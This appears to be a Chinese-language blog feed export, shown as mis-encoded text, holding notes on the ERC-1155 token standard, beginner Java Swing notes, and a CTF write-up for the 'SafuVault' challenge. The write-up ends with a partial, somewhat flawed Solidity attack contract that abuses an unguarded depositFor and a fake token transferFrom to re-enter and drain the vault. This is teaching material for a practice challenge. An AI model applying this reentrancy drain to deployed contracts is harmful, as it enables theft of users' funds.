title="æ‰¹é‡ä½™é¢"></a>æ‰¹é‡ä½™é¢</h3><p>åœ¨ä¸€æ¬¡è°ƒç”¨ä¸­è·å–å¤šä¸ªèµ„äº§çš„ä½™é¢</p><p>ç›¸åº”çš„ ERC-20 balanceOf è°ƒç”¨åŒæ ·å…·æœ‰æ”¯æŒæ‰¹å¤„ç†çš„ç›¸åº”å‡½æ•°ã€‚ è¿˜æ˜¯åšä¸ªå¯¹æ¯”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-20</span><br><span class="line">function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">// ERC-1155</span><br><span class="line">function balanceOfBatch(</span><br><span class="line">    address[] calldata _owners,</span><br><span class="line">    uint256[] calldata _ids</span><br><span class="line">) external view returns (uint256[] memory);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ä½™é¢æŸ¥è¯¢æ›´ç®€å•çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å•æ¬¡è°ƒç”¨ä¸­è·å–å¤šä¸ªä½™é¢ã€‚ å‚æ•°ä¸­ä¼ é€’æ‰€æœ‰è€…å¸æˆ·æ•°ç»„å’Œä»£å¸çš„ id æ•°ç»„ã€‚</p><p>ä¾‹å¦‚ï¼Œå¯¹äºç»™å‡ºçš„ _ids&#x3D;[3, 6, 13] å’Œ _owners&#x3D;[0xbeefâ€¦, 0x1337â€¦, 0x1111â€¦]ï¼Œè¿”å›å€¼å°†ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    balanceOf(0xbeef...),</span><br><span class="line">    balanceOf(0x1337...),</span><br><span class="line">    balanceOf(0x1111...)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="æ‰¹é‡å®¡æ‰¹"><a href="#æ‰¹é‡å®¡æ‰¹" class="headerlink" title="æ‰¹é‡å®¡æ‰¹"></a>æ‰¹é‡å®¡æ‰¹</h3><p>å®¡æ‰¹åŒä¸€åœ°å€çš„æ‰€æœ‰ä»£å¸</p><p>è¿˜æ˜¯æ¥çœ‹ä¸€ä¸‹ERC115</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-1155</span><br><span class="line">function setApprovalForAll(</span><br><span class="line">    address _operator,</span><br><span class="line">    bool _approved</span><br><span class="line">) external;</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(</span><br><span class="line">    address _owner,</span><br><span class="line">    address _operator</span><br><span class="line">) external view returns (bool);</span><br></pre></td></tr></table></figure><p>å®¡æ‰¹è¿‡ç¨‹ä¸ ERC-20 ç•¥æœ‰ä¸åŒã€‚ è¿™é‡Œä¸æ˜¯æ‰¹å‡†ç‰¹å®šé‡‘é¢ï¼Œè€Œæ˜¯é€šè¿‡ setApprovalForAll å‡½æ•°è®¾ç½®æ“ä½œå¸æˆ·ä¸ºå·²æ‰¹å‡†æˆ–æœªæ‰¹å‡†ã€‚</p><p>æŸ¥çœ‹å½“å‰çš„å®¡æ‰¹çŠ¶æ€å¯ä»¥é€šè¿‡ isApprovedForAll å®Œæˆã€‚ å¦‚ä½ æ‰€è§ï¼Œè¦ä¹ˆå…¨éƒ¨æ‰¹å‡†ï¼Œè¦ä¹ˆä¸æ‰¹å‡†ã€‚ ä¸èƒ½å®šä¹‰è¦æ‰¹å‡†ä»£å¸çš„æ•°é‡ï¼Œç”šè‡³ä»£å¸ç±»å‹ã€‚</p><p>è¿™æ˜¯è€ƒè™‘åˆ°ç®€æ´æ€§è€Œæ•…æ„è®¾è®¡çš„ã€‚ ä½ åªèƒ½æ‰¹å‡†ä¸€ä¸ªåœ°å€çš„æ‰€æœ‰ä»£å¸ã€‚</p><h3 id="æ¥å—é’©å­"><a href="#æ¥å—é’©å­" class="headerlink" title="æ¥å—é’©å­"></a>æ¥å—é’©å­</h3><p>æ¥å—é’©å­çš„ä»£å¸å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">    address _operator,</span><br><span class="line">    address _from,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external returns(bytes4);</span><br></pre></td></tr></table></figure><p>åŸºäº EIP-165(opens in a new tab) çš„åè®®æ”¯æŒï¼ŒERC-1155 åªæ”¯æŒæ™ºèƒ½åˆçº¦çš„æ¥æ”¶é’©å­å‡½æ•°ã€‚ é’©å­å‡½æ•°å¿…é¡»è¿”å›ä¸€ä¸ªäº‹å…ˆé¢„å®šä¹‰çš„ 4 å­—èŠ‚å€¼ï¼Œè¿™ä¸ªå€¼è¢«æŒ‡å®šä¸ºï¼š<code>bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))</code><br>å½“æ¥æ”¶åˆçº¦è¿”å›è¿™ä¸€å€¼æ—¶ï¼Œæ„å‘³ç€åˆçº¦çŸ¥é“å¦‚ä½•å¤„ç† ERC-1155 ä»£å¸å¹¶æ¥å—è½¬è´¦ã€‚ å¤ªå¥½äº†ï¼Œä»£å¸ä¸ä¼šå†å¡åœ¨åˆçº¦ä¸­äº†ï¼ï¼ˆè¿™é‡Œå¯èƒ½ä¼šæ˜¯æ¼æ´ï¼Œæ¯”å¦‚<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/game-assets">ç‚¹å‡»</a>è¿™ä¸ªé¢˜å°±æ˜¯ä½¿ç”¨åˆ°äº†é’©å­ï¼Œè®©ä»£å¸å›°åœ¨åˆçº¦ä¸­ï¼‰</p><h3 id="å®‰å…¨è½¬è´¦"><a href="#å®‰å…¨è½¬è´¦" class="headerlink" title="å®‰å…¨è½¬è´¦"></a>å®‰å…¨è½¬è´¦</h3><p> ç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ€é‡è¦çš„è§„åˆ™ï¼š</p><p>1ï¼Œè°ƒç”¨è€…å¿…é¡»è·å¾—æ‰¹å‡†æ‰èƒ½ä» _from çš„å¸æˆ·åœ°å€æ¶ˆè´¹ä»£å¸ï¼Œæˆ–è€…è°ƒç”¨è€…å¸æˆ·åœ°å€å¿…é¡»ä¸ _from çš„å¸æˆ·åœ°å€ç›¸åŒã€‚<br>2ï¼Œåœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼Œè½¬è´¦è°ƒç”¨å°†å›é€€</p><ul><li>_to åœ°å€ä¸º 0ï¼›</li><li>_ids çš„é•¿åº¦ä¸ _values çš„é•¿åº¦ä¸åŒï¼›</li><li>_ids ä¸­ä»£å¸æŒæœ‰è€…çš„ä»»ä½•ä½™é¢ä½äºå‘é€ç»™æ¥æ”¶è€…çš„ç›¸åº” _value é‡‘é¢ã€‚å‡ºç°ä»»ä½•å…¶ä»–é”™è¯¯ã€‚<blockquote><p>æ³¨æ„ï¼šåŒ…æ‹¬é’©å­åœ¨å†…çš„æ‰€æœ‰æ‰¹å¤„ç†å‡½æ•°ä¹Ÿå‡ä½œä¸ºéæ‰¹å¤„ç†çš„ç‰ˆæœ¬å­˜åœ¨ã€‚ è¿™æ ·åšæ˜¯ä¸ºäº†æé«˜ç‡ƒæ–™æ•ˆç‡ï¼Œè€ƒè™‘åˆ°åªè½¬ç§»ä¸€ç§èµ„äº§å¯èƒ½ä»ç„¶æ˜¯æœ€å¸¸ç”¨çš„æ–¹å¼ã€‚ ç®€æ´èµ·è§ï¼Œæˆ‘ä»¬æ²¡æœ‰åœ¨è¿™é‡Œä»‹ç»è¿™äº›éæ‰¹å¤„ç†çš„ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬å®‰å…¨è½¬è´¦è§„åˆ™ã€‚ åç§°æ˜¯ç›¸åŒçš„ï¼Œåªéœ€ç§»é™¤ â€˜Batchâ€™ã€‚</p></blockquote></li></ul><h2 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h2><p>IERC1155æ¥å£ï¼Œæ¥å£ä¸­å®šä¹‰äº†å…­ä¸ªå‡½æ•°</p><ul><li>balanceOf()ï¼šå•å¸ç§ä½™é¢æŸ¥è¯¢ï¼Œè¿”å›accountæ‹¥æœ‰çš„idç§ç±»çš„ä»£å¸çš„æŒä»“é‡ã€‚</li><li>balanceOfBatch()ï¼šå¤šå¸ç§ä½™é¢æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„åœ°å€accountsæ•°ç»„å’Œä»£å¸ç§ç±»idsæ•°ç»„çš„é•¿åº¦è¦ç›¸ç­‰ã€‚</li><li>setApprovalForAll()ï¼šæ‰¹é‡æˆæƒï¼Œå°†è°ƒç”¨è€…çš„ä»£å¸æˆæƒç»™operatoråœ°å€ã€‚ã€‚</li><li>isApprovedForAll()ï¼šæŸ¥è¯¢æ‰¹é‡æˆæƒä¿¡æ¯ï¼Œå¦‚æœæˆæƒåœ°å€operatorè¢«accountæˆæƒï¼Œåˆ™è¿”å›trueã€‚</li><li>safeTransferFrom()ï¼šå®‰å…¨å•å¸è½¬è´¦ï¼Œå°†amountå•ä½idç§ç±»çš„ä»£å¸ä»fromåœ°å€è½¬è´¦ç»™toåœ°å€ã€‚å¦‚æœtoåœ°å€æ˜¯åˆçº¦ï¼Œåˆ™ä¼šéªŒè¯æ˜¯å¦å®ç°äº†onERC1155Received()æ¥æ”¶å‡½æ•°ã€‚</li><li>safeBatchTransferFrom()ï¼šå®‰å…¨å¤šå¸è½¬è´¦ï¼Œä¸å•å¸è½¬è´¦ç±»ä¼¼ï¼Œåªä¸è¿‡è½¬è´¦æ•°é‡amountså’Œä»£å¸ç§ç±»idså˜ä¸ºæ•°ç»„ï¼Œä¸”é•¿åº¦ç›¸ç­‰ã€‚<strong>å¦‚æœtoåœ°å€æ˜¯åˆçº¦ï¼Œåˆ™ä¼šéªŒè¯æ˜¯å¦å®ç°äº†onERC1155BatchReceived()æ¥æ”¶å‡½æ•°ã€‚</strong>ï¼ˆé‡ç‚¹ï¼‰</li></ul><p>å¦‚æœERC1155TOKENçš„æ¥æ”¶è€…receiveræ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œé‚£ä¹ˆæ¥æ”¶è€…å¿…é¡»è¦å®ç°è¯¥æ¥å£ã€‚</p><p>è¯¥æ¥å£æœ‰ä¸¤ä¸ªå‡½æ•°ï¼šï¼ˆå‰ææ˜¯æ¥æ”¶è€…æ˜¯åˆçº¦åœ°å€ï¼‰ï¼š</p><ul><li>onERC1155Receivedï¼šè¿™ä¸ªå‡½æ•°æ˜¯åœ¨è°ƒç”¨ ERC1155çš„ safeTransferFrom()å’Œ _mint()æ—¶ï¼Œæ¥æ”¶è€…çš„è¯¥å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œå¹¶æŒ‰è¦æ±‚è¿”å›æŒ‡å®šçš„å€¼ bytes4(keccak256(â€œonERC1155Received(address,address,uint256,uint256,bytes)â€))ã€‚</li><li>onERC1155BatchReceivedï¼šè¿™ä¸ªå‡½æ•°æ—¶åœ¨è°ƒç”¨ ERC1155çš„ safeBatchTransferFrom()æ—¶ï¼Œæ¥æ”¶è€…çš„è¯¥å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œå¹¶æŒ‰è¦æ±‚è¿”å›æŒ‡å®šçš„å€¼ bytes4(keccak256(â€œonERC1155BatchReceived(address,address,uint256[],uint256[],bytes)â€))</li></ul><p>å¦‚æœæˆ‘ä»¬ä¸æŒ‰è¦æ±‚è¿”å›ä¸€ä¸ªæŒ‡å®šå€¼ï¼Œé‚£ä¹ˆä»£å¸å°±ä¼šè½¬ç§»ä¸å‡ºæ¥ï¼Œå›°åœ¨åˆçº¦ä¸­ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> åè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ</title>
      <link href="/2024/10/21/java-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/10/21/java-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘è¦åšä¸ªä¸€javaçš„å­¦ç”Ÿç®¡ç†ç³»ç»Ÿï¼Œè¦ä¸€æ®µå¾ˆé•¿æ—¶é—´ï¼Œè¿˜æ˜¯ä»é›¶å¼€å§‹ï¼Œæ‰€ä»¥å°±è®°ä¸ªç¬”è®°ï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±çš„å­¦ä¹ çŸ¥è¯†ï¼Œæ„Ÿè§‰å’Œä¹‹å‰å­¦çš„ç½‘é¡µé¢æœ‰ä¸€äº›çŸ¥è¯†çš„å…³è”ã€‚</p><p>é‡‡ç”¨ä¸€ä¸ªjava+Swingçš„æ¡†æ¶ï¼Œ</p><h2 id="Swing"><a href="#Swing" class="headerlink" title="Swing"></a>Swing</h2><p>Swing æ˜¯ä¸€ä¸ªä¸ºJavaè®¾è®¡çš„GUIå·¥å…·åŒ…ã€‚</p><p>GUIï¼ˆå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼‰ä¸ºç¨‹åºæä¾›å›¾å½¢ç•Œé¢ï¼Œå®ƒæœ€åˆçš„è®¾è®¡ç›®çš„æ˜¯ä¸ºç¨‹åºå‘˜æ„å»ºä¸€ä¸ªé€šç”¨çš„ GUIï¼Œä½¿å…¶èƒ½å¤Ÿåœ¨æ‰€æœ‰çš„å¹³å°ä¸Šè¿è¡Œï¼Œä½† Java 1.0 ä¸­åŸºç¡€ç±» AWTï¼ˆæŠ½è±¡çª—å£å·¥å…·ç®±ï¼‰å¹¶æ²¡æœ‰è¾¾åˆ°è¿™ä¸ªè¦æ±‚ï¼Œäºæ˜¯ Swing å‡ºç°äº†ï¼Œå®ƒæ˜¯ AWT ç»„ä»¶çš„å¢å¼ºç»„ä»¶ï¼Œä½†æ˜¯å®ƒåˆä¸èƒ½å®Œå…¨æ›¿ä»£ AWT ç»„ä»¶ï¼Œè¿™ä¸¤ç§ç»„ä»¶éœ€è¦åŒæ—¶å‡ºç°åœ¨ä¸€ä¸ªå›¾å½¢ç”¨æˆ·ç•Œé¢ä¸­ã€‚</p><p>SwingåŒ…æ‹¬äº†å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰å™¨ä»¶å¦‚ï¼šæ–‡æœ¬æ¡†ï¼ŒæŒ‰é’®ï¼Œåˆ†éš”çª—æ ¼å’Œè¡¨ã€‚</p><p>Swingæä¾›è®¸å¤šæ¯”AWTæ›´å¥½çš„å±å¹•æ˜¾ç¤ºå…ƒç´ ã€‚å®ƒä»¬ç”¨çº¯Javaå†™æˆï¼Œæ‰€ä»¥åŒJavaæœ¬èº«ä¸€æ ·å¯ä»¥è·¨å¹³å°è¿è¡Œï¼Œè¿™ä¸€ç‚¹ä¸åƒAWTã€‚å®ƒä»¬æ˜¯JFCçš„ä¸€éƒ¨åˆ†ã€‚å®ƒä»¬æ”¯æŒå¯æ›´æ¢çš„é¢æ¿å’Œä¸»é¢˜ï¼ˆå„ç§æ“ä½œç³»ç»Ÿé»˜è®¤çš„ç‰¹æœ‰ä¸»é¢˜ï¼‰ï¼Œç„¶è€Œä¸æ˜¯çœŸçš„ä½¿ç”¨åŸç”Ÿå¹³å°æä¾›çš„è®¾å¤‡ï¼Œè€Œæ˜¯ä»…ä»…åœ¨è¡¨é¢ä¸Šæ¨¡ä»¿å®ƒä»¬ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥åœ¨ä»»æ„å¹³å°ä¸Šä½¿ç”¨JAVAæ”¯æŒçš„ä»»æ„é¢æ¿ã€‚è½»é‡çº§ç»„ä»¶çš„ç¼ºç‚¹åˆ™æ˜¯æ‰§è¡Œé€Ÿåº¦è¾ƒæ…¢ï¼Œä¼˜ç‚¹å°±æ˜¯å¯ä»¥åœ¨æ‰€æœ‰å¹³å°ä¸Šé‡‡ç”¨ç»Ÿä¸€çš„è¡Œä¸ºã€‚</p><p>æˆ‘ç†è§£çš„å°±æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿçš„è½¯ä»¶ï¼Œç±»ä¼¼äºUIç½‘é¡µè®¾è®¡</p><h3 id="SwingåŒ…"><a href="#SwingåŒ…" class="headerlink" title="SwingåŒ…"></a>SwingåŒ…</h3><p>æœ‰ä¸‰ä¸ªæ¯”è¾ƒé‡è¦çš„åŒ…ï¼ŒComponentç±»ï¼ŒCotainerç±»ï¼ŒJComponentç±»ï¼Œ<br>å±‚æ¬¡å’Œç»§æ‰¿å…³ç³»ï¼š<br>Java.lang.Object-&gt;Java.awt-&gt;Component-&gt;Java.awt.Container-&gt;Javax.swing.JComponent</p><p>Swing ç»„ä»¶ä¸­çš„å¤§å¤šæ•° GUI ç»„ä»¶éƒ½æ˜¯ Component ç±»çš„ç›´æ¥å­ç±»æˆ–é—´æ¥å­ç±»ï¼ŒJComponent ç±»æ˜¯ Swing ç»„ä»¶å„ç§ç‰¹æ€§çš„å­˜æ”¾ä½ç½®ï¼Œè¿™äº›ç»„ä»¶çš„ç‰¹æ€§åŒ…æ‹¬è®¾å®šç»„ä»¶è¾¹ç•Œã€GUI ç»„ä»¶è‡ªåŠ¨æ»šåŠ¨ç­‰ã€‚</p><p>Swing ç»„ä»¶ä¸­çš„æœ€é‡è¦çš„çˆ¶ç±»æ˜¯ Container ç±»ï¼ŒContainer ç±»åˆæœ‰ä¸¤ä¸ªæœ€é‡è¦çš„å­ç±»ï¼Œåˆ†åˆ«ä¸º java.awt.Window ä¸ java.awt.Frameã€‚é™¤äº†ä»¥å¾€çš„ AWT ç±»ç»„ä»¶ä¼šç»§æ‰¿è¿™ä¸¤ä¸ªç±»ä¹‹å¤–ï¼Œç°åœ¨çš„ Swing ç»„ä»¶åŒæ ·ä¹Ÿä¼šæ‰©å±•äº†è¿™ä¸¤ä¸ªç±»</p><h3 id="å¸¸è§çš„ç»„ä»¶"><a href="#å¸¸è§çš„ç»„ä»¶" class="headerlink" title="å¸¸è§çš„ç»„ä»¶"></a>å¸¸è§çš„ç»„ä»¶</h3><p>JButton :æŒ‰é’®ï¼Œå¯ä»¥å¸¦ä¸€äº›å›¾ç‰‡æˆ–è€…æ–‡å­—<br>JCheckBox :å¤é€‰æ¡†<br>JComBox :ä¸‹æ‹‰åˆ—è¡¨æ¡†ï¼Œå¯ä»¥åœ¨ä¸‹æ‹‰æ˜¾ç¤ºåŒºåŸŸå¤šä¸ªé€‰é¡¹<br>JFrame : æ¡†æ¶ç±»<br>JDialog :å¯¹è¯æ¡†<br>JLable :æ ‡ç­¾ç»„ä»¶<br>JRadioButton :å•é€‰æŒ‰é’®<br>JList :èƒ½å¤Ÿåœ¨ç”¨æˆ·ä¸­æ˜¾ç¤ºä¸€äº›åˆ—æ¡ç›®çš„ç»„ä»¶<br>JTextField :æ–‡æœ¬æ¡†<br>JPasswordField :å¯†ç æ¡†<br>JTextArea :æ–‡æœ¬åŒºåŸŸ<br>JOptionPane :ä¸€äº›é¢æ¿</p><h3 id="å¸¸è§çš„é¡¶å±‚çª—ä½“"><a href="#å¸¸è§çš„é¡¶å±‚çª—ä½“" class="headerlink" title="å¸¸è§çš„é¡¶å±‚çª—ä½“"></a>å¸¸è§çš„é¡¶å±‚çª—ä½“</h3><p>çª—ä½“ä½œä¸º Swing åº”ç”¨ç¨‹åºä¸­ç»„ä»¶çš„æ‰¿è½½ä½“ï¼Œå¤„äºéå¸¸é‡è¦çš„ä½ç½®ã€‚Swing ä¸­å¸¸ç”¨çš„çª—ä½“åŒ…æ‹¬ JFrame å’Œ JDialog çª—ä½“</p><h4 id="JFrameæ¡†æ¶"><a href="#JFrameæ¡†æ¶" class="headerlink" title="JFrameæ¡†æ¶"></a>JFrameæ¡†æ¶</h4><p>JFrame çª—ä½“æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå®ƒæ˜¯ Swing ç¨‹åºä¸­å„ä¸ªç»„ä»¶çš„è½½ä½“ï¼Œå› æ­¤ï¼Œå¯ä»¥å°† JFrame çœ‹ä½œæ˜¯æ‰¿è½½è¿™äº› Swing ç»„ä»¶çš„å®¹å™¨ã€‚</p><p>åœ¨å¼€å‘åº”ç”¨ç¨‹åºæ—¶ï¼Œå¯ä»¥é€šè¿‡ç»§æ‰¿ java.swing.JFrame ç±»æ¥åˆ›å»ºä¸€ä¸ªçª—ä½“ï¼Œç„¶åå†åœ¨çª—ä½“ä¸­æ·»åŠ ç»„ä»¶ï¼ŒåŒæ—¶ä¸ºç»„ä»¶è®¾ç½®äº‹ä»¶ã€‚ç”±äºè¯¥çª—ä½“ç»§æ‰¿äº† JFrame ç±»ï¼Œæ‰€ä»¥å®ƒæ‹¥æœ‰æœ€å¤§åŒ–ã€æœ€å°åŒ–å’Œå…³é—­æŒ‰é’®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JFrame frame = new JFrame(title);</span><br><span class="line">Container container = frame.getContentPane();</span><br></pre></td></tr></table></figure><ul><li>frameï¼šJFrame ç±»çš„å¯¹è±¡ã€‚</li><li>containerï¼šContainer ç±»çš„å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨ JFrame å¯¹è±¡è°ƒç”¨getContentPane() æ–¹æ³•è·å–ã€‚</li></ul><p>æˆ‘ä»¬åº”è¯¥æœ‰è¿™æ ·çš„ä¸€ä¸ªæ¦‚å¿µï¼Œå°±æ˜¯ Swing ç»„ä»¶çš„çª—ä½“é€šå¸¸ä¸ç»„ä»¶å’Œå®¹å™¨ç›¸å…³ï¼Œæ‰€ä»¥åœ¨ JFrame å¯¹è±¡åˆ›å»ºå®Œæˆåï¼Œéœ€è¦è°ƒç”¨ getContentPane() æ–¹æ³•å°†çª—ä½“è½¬æ¢ä¸ºå®¹å™¨ï¼Œç„¶ååœ¨å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶æˆ–è®¾ç½®å¸ƒå±€ç®¡ç†å™¨ã€‚é€šå¸¸è¿™ä¸ªå®¹å™¨ç”¨æ¥åŒ…å«å’Œæ˜¾ç¤ºç»„ä»¶ã€‚å¦‚æœéœ€è¦å°†ç»„ä»¶æ·»åŠ è‡³å®¹å™¨ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨æ¥è‡ª Container ç±»çš„ add() æ–¹æ³•è¿›è¡Œè®¾ç½®ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">container.add(new JButton(&quot;æŒ‰é’®&quot;));                     //JButtonæŒ‰é’®ç»„ä»¶</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SafuVault</title>
      <link href="/2024/10/20/CTF-SafuVault/"/>
      <url>/2024/10/20/CTF-SafuVault/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SafuVault"><a href="#CTF-SafuVault" class="headerlink" title="CTF-SafuVault"></a>CTF-SafuVault</h1><p>è¿™ä¸ªé¢˜çš„æºä»£ç <a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-vault">è¿™é‡Œ</a></p><p>é¢˜ç›®è¦æ±‚å°±æ˜¯ï¼šè·å¾—ä¸å°‘äºä¿é™©åº“çš„90%ä»£å¸</p><p>è¿˜æ˜¯å…ˆé˜…è¯»ä»£ç ï¼Œåˆçº¦<code>SafeVault</code>,æ˜¯ä¸€ä¸ªå®‰å…¨çš„æ”¶ç›Šé‡‘åº“ï¼Œç”¨äºç”¨æˆ·å­˜å…¥ä»£å¸ï¼Œç„¶åé‡‘åº“ä¼šè°ƒç”¨ç­–ç•¥åˆçº¦ <code>SafuVault</code>çš„<code>deposit</code>å‡½æ•°å°†å­˜å…¥çš„ä»£å¸è¿›è¡ŒæŠ•èµ„ï¼Œç”¨æˆ·é€šè¿‡<code>withdraw</code>å‡½æ•°æå–å®ƒä»¬çš„ä»£å¸ï¼Œå…¶ä¸­è¿˜æœ‰ä¸ª<code>depositFor</code>å‡½æ•°ï¼Œå…è®¸å…¶ä»–ç”¨æˆ·ä¸ºå…¶ä»–äººå­˜æ¬¾ï¼Œè¿™ä¸ªæ”¶ç›Šåˆçº¦çœ‹èµ·æ¥è¿˜æ˜¯åŠŸèƒ½æŒºé½å…¨çš„ã€‚<br>è€Œæ”¶ç›Šç”Ÿæˆåˆçº¦ <code>SafuStrategy</code>,å°±æ˜¯æ¥ç®¡ç†å­˜å…¥é‡‘åº“çš„èµ„é‡‘ï¼Œè¦æƒ³è·å¾—èµ„é‡‘çš„è¯ï¼Œè¿˜æ˜¯çš„åŒé€šè¿‡é‡‘åº“åˆçº¦ï¼Œåå¤æŸ¥çœ‹è¿™ä¸ªåˆçº¦çš„ï¼Œå¼€å§‹æ—¶å¹¶æ²¡æœ‰å‘ç°è·å¾—èµ„é‡‘çš„æ–¹æ³•ï¼ŒæŸ¥çœ‹äº†æç¤ºï¼šæ‰€æœ‰å¤–éƒ¨åŠŸèƒ½éƒ½å¾—åˆ°å¦¥å–„ä¿æŠ¤å—ï¼Ÿåˆå»çœ‹äº†é‡‘åº“åˆçº¦çš„å‡½æ•°ï¼Œå‘ç°<code>deposit</code>å’Œ<code>depositFor</code>å‡½æ•°ä¿®é¥°é™å®šä¸ä¸€æ ·ï¼Œå…·ä½“çœ‹ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(uint256 _amount) public nonReentrant &#123;</span><br><span class="line">        strategy.beforeDeposit();</span><br><span class="line"></span><br><span class="line">        uint256 _pool = balance();</span><br><span class="line">        want().safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        earn();</span><br><span class="line">        uint256 _after = balance();</span><br><span class="line">        _amount = _after - _pool; // Additional check for deflationary tokens</span><br><span class="line"></span><br><span class="line">        uint256 shares;</span><br><span class="line">        if (totalSupply() == 0) &#123;</span><br><span class="line">            shares = _amount;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shares = (_amount * totalSupply()) / (_pool);</span><br><span class="line">        &#125;</span><br><span class="line">        _mint(msg.sender, shares);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function depositFor(</span><br><span class="line">        address token, </span><br><span class="line">        uint256 _amount, </span><br><span class="line">        address user</span><br><span class="line">    ) public &#123;</span><br><span class="line">        strategy.beforeDeposit();</span><br><span class="line"></span><br><span class="line">        uint256 _pool = balance();</span><br><span class="line">        IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        earn();</span><br><span class="line">        uint256 _after = balance();</span><br><span class="line">        _amount = _after - _pool; // Additional check for deflationary tokens</span><br><span class="line"></span><br><span class="line">        uint256 shares;</span><br><span class="line">        if (totalSupply() == 0) &#123;</span><br><span class="line">            shares = _amount;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shares = (_amount * totalSupply()) / (_pool);</span><br><span class="line">        &#125;</span><br><span class="line">        _mint(user, shares);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>deposit</code>å‡½æ•°æœ‰é˜²æ­¢é‡å…¥çš„åŠŸèƒ½ï¼Œè€Œ<code>depositFor</code>æ²¡æœ‰ï¼Œè¿™æ˜¯å°±ä¼šè”æƒ³åˆ°ï¼Œä¼šä¸ä¼šå°±æ˜¯é‡å…¥æ”»å‡»ï¼Œå†æ¯”è¾ƒè¿™ä¿©ä¸ªåˆçº¦ï¼Œå‘ç°<code>depositFor</code>ä½¿ç”¨äº†<code>token</code>åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¿™ä¸ªç»™äº†å¾ˆå¤§çš„æ“ä½œç©ºé—´ï¼Œå¦‚æœåœ¨<code>token</code>åœ°å€ä¸Šè¿›è¡Œè½¬è´¦çš„transferå‡½æ•°ä¸­å¤¹å¸¦ä¸€ä¸ªå†æ¬¡å­˜æ¬¾åˆçº¦çš„è¯ï¼Œå°±ä¼šè¿›è¡Œä¸€ä¸ªé‡å…¥æ”»å‡»ï¼Œåå¤å­˜æ¬¾ï¼Œæœ€åå†<code>withdrawall</code>.å°±èƒ½è·å¾—å¤§é‡çš„ä»£å¸</p><p>å…·ä½“çš„æ”»å‡»åˆçº¦</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;interface IValue &#123;    function depositFor(        address token,         uint256 _amount,         address user    ) internal;    function withdrawAll() external ;    &#125; contract Hack &#123;    IERC20 token;    IValue value;    uint256 loop = 10;    constructor (address _token,address _value)&#123;        token = IERC20(_token);        value = IValue(_value);    &#125;    function pwn() external&#123;        //è®¡ç®—é‡å…¥å‡ æ¬¡ï¼Œè·å¾—è¶…è¿‡é‡‘åº“åˆçº¦çš„90%ä»£å¸        uint256 amount = token.balanceOf(address(this));        uint256 amount1 = amount /10;        value.depositFor(address(this),amount1,address(this));        value.withdraw();        //æ­¤æ—¶çš„msg.senderæ˜¯æˆ‘ä»¬è‡ªå·±ï¼Œå› ä¸ºæ˜¯æˆ‘ä»¬å‘èµ·pwn        token.transfer(msg.sender,token.balanceOf(address(this)));        &#125;    function transferFrom(address from,address to,address amount1) external&#123;        if(loop&lt;10)&#123;           //æ­¤æ—¶çš„msg.senderæ˜¯é‡‘åº“åˆçº¦ï¼Œå› 